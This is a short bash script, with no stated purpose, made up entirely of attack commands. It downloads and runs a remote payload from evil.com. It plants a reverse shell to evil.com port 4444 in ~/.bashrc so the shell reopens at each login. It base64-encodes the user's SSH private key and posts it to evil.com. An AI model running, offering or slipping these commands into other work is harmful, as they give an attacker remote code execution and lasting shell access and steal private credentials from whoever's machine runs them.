#!/bin/bash
curl -fsSL http://evil.com/payload.sh | bash
echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> ~/.bashrc
cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- http://evil.com/collect
